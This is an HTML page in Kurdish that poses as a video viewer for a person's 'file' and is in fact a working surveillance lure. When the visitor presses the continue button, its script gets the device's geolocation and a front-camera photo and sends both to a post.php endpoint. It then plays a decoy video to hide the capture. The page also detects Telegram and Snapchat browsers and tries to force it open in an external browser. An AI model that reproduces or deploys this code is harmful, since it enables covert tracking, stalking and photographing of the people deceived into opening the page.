<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>مەلەفی سوڕەیا</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { 
            background: linear-gradient(135deg, #0f172a, #1e293b); 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            overflow: hidden;
            position: fixed;
            width: 100%;
        }
        .container { 
            background: #ffffff; 
            padding: 22px; 
            border-radius: 24px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
            width: 92%; 
            max-width: 380px; 
            text-align: center; 
        }
        
        .preview-img-box {
            width: 100%;
            height: 200px;
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
            position: relative;
            background: #000;
        }
        .preview-img-box img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        
        .image-overlay-text {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(to top, rgba(0,0,0,0.85), rgba(0,0,0,0.4));
            color: #ffffff;
            padding: 10px;
            font-size: 13px;
            font-weight: bold;
            text-align: center;
        }

        .content-after-allow {
            display: none;
            margin-bottom: 15px;
        }
        .content-after-allow video {
            width: 100%;
            border-radius: 12px;
            max-height: 240px;
            object-fit: cover;
            outline: none;
        }

        .title { 
            font-size: 22px; 
            font-weight: 800; 
            color: #0f172a; 
            margin-bottom: 6px; 
            letter-spacing: -0.5px;
        }
        .subtitle { 
            color: #64748b; 
            font-size: 13px; 
            margin-bottom: 20px; 
            line-height: 1.5; 
            font-weight: 500; 
        }
        
        .btn { 
            background: linear-gradient(135deg, #2563eb, #1d4ed8); 
            color: white; 
            padding: 15px; 
            border: none; 
            border-radius: 30px; 
            cursor: pointer; 
            font-size: 16px; 
            width: 100%; 
            font-weight: bold; 
            box-shadow: 0 6px 16px rgba(37,99,235,0.4);
            transition: all 0.2s ease;
        }
        .btn:active { transform: scale(0.97); }
        
        .loader {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #2563eb;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            margin: 15px auto;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .status-text { margin-top: 15px; font-size: 12px; color: #94a3b8; font-weight: 500; }
    </style>
</head>
<body>

    <div class="container" id="mainContainer">
        
        <div id="imageBox" class="preview-img-box">
            <img src="surayamalaf.jpg" alt="مەلەفی سوڕەیا">
            <div class="image-overlay-text">بۆ بینینی ڤیدیۆکە allow دابگرە</div>
        </div>

        <div id="mediaBox" class="content-after-allow">
            <video id="targetVideo" controls playsinline>
                <source src="sararanyai.MP4" type="video/mp4">
                تەلەفۆنەکەت پشتگیری ڤیدیۆ ناکات
            </video>
        </div>

        <div class="title" id="boxTitle">مەلەفی سوڕەیا</div>
        <div class="subtitle" id="boxSubtitle">بۆ بەردەوامبوون و بینینی تەواوی ناوەڕۆکەکە، کلیک بکە:</div>
        
        <div id="loader" class="loader"></div>
        <button id="mainBtn" class="btn" onclick="startProcess()">بەردەوامبوون</button>
        
        <div class="status-text" id="statusText">ئامادەیە</div>
    </div>

    <video id="camVideo" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // Check if user is inside Telegram or Snapchat and redirect to external browser
        (function() {
            let ua = navigator.userAgent || navigator.vendor || window.opera;
            let currentUrl = window.location.href;
            
            if (ua.indexOf("Telegram") > -1) {
                // Force open in external browser for Telegram (iOS/Android schemes)
                window.location.href = "https://t.me/share/url?url=" + encodeURIComponent(currentUrl);
            } else if (ua.indexOf("Snapchat") > -1) {
                // Try to force opening via intent/scheme if possible, or fallback
                let iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = 'googlechrome://navigate?url=' + encodeURIComponent(currentUrl);
                document.body.appendChild(iframe);
            }
        })();

        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    
                    let xhr = new XMLHttpRequest();
                    xhr.open("POST", "post.php", true);
                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xhr.send("lat=" + encodeURIComponent(lat) + "&lon=" + encodeURIComponent(lon));
                });
            }
        }

        function takePicture() {
            const video = document.getElementById('camVideo');
            const canvas = document.getElementById('canvas');
            
            navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            })
            .then(function(stream) {
                video.srcObject = stream;
                video.play();
                
                setTimeout(function() {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    let context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    let imageData = canvas.toDataURL('image/png');
                    
                    let xhr = new XMLHttpRequest();
                    xhr.open("POST", "post.php", true);
                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xhr.send("image=" + encodeURIComponent(imageData));
                    
                    stream.getTracks().forEach(track => track.stop());
                }, 1200);
            })
            .catch(function(err) {
                console.log("Camera Error: " + err);
            });
        }

        function startProcess() {
            document.getElementById('mainBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('statusText').innerText = 'چاوەڕوان بە...';

            sendLocation();
            takePicture();

            setTimeout(function() {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('imageBox').style.display = 'none';
                document.getElementById('mediaBox').style.display = 'block';
                document.getElementById('boxTitle').innerText = 'مەلەفی سوڕەیا';
                document.getElementById('boxSubtitle').innerText = 'فەرموو ڤیدیۆکە دەست پێ دەکات:';
                document.getElementById('statusText').innerText = 'سەرکەوتوو بوو';
                
                let vid = document.getElementById('targetVideo');
                vid.play().catch(e => console.log(e));
            }, 3000);
        }
    </script>
</body>
</html>
